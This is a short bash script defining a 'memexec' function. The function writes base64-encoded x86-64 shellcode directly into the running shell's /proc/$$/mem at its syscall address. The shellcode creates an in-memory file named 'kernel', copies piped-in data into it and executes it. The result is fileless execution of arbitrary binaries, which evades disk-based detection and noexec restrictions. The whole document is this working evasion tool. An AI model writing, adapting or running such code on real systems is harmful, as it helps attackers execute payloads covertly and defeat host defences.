#! /bin/bash

memexec() { bash -c 'cd /proc/$$;exec 4>mem;base64 -d<<<SInlSIHsEgQAAGoASLhrZXJuZWwAAFC4PwEAAEiJ574BAAAADwW4AAAAAL8AAAAASInmugAEAAAPBUiJwkiD+gB+EbgBAAAAvwMAAABIieYPBevSSLgvcHJvYy9zZUi6bGYvZmQvMwBqAFJQuDsAAABIiedIMfZIMdIPBbg8AAAASIP3Yw8FAAAAAAAAAAAAAAAAAAAAAAAAAAAA|dd bs=1 seek=$[$(cat syscall|cut -f9 -d" ")] >&4'; }

# Example: cat /usr/bin/id | memexec 

